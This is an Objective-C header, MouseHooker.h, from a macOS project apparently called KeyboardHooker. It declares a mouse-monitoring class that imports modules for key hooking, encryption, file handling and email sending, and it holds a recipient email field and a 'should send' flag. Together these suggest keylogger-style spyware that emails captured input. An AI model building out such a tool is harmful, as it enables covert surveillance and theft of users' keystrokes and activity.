//
//  MouseHooker.h
//  KeyboardHooker
//
//  Created by Иван on 24.11.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <Cocoa/Cocoa.h>

#import "Time.h"
#import "KeyRunLoop.h"
#import "EmailSender.h"
#import "FileManager.h"
#import "Cryptographer.h"

#import "KeyHooker.h"

@interface MouseHooker : NSObject<ShouldSendDelegate>

{
    NSInteger fileSize;
    BOOL shouldSend;
    NSString *email;
    BOOL trueEmail;
}

- (id)init;
- (void)setMouseNotifications;

@end
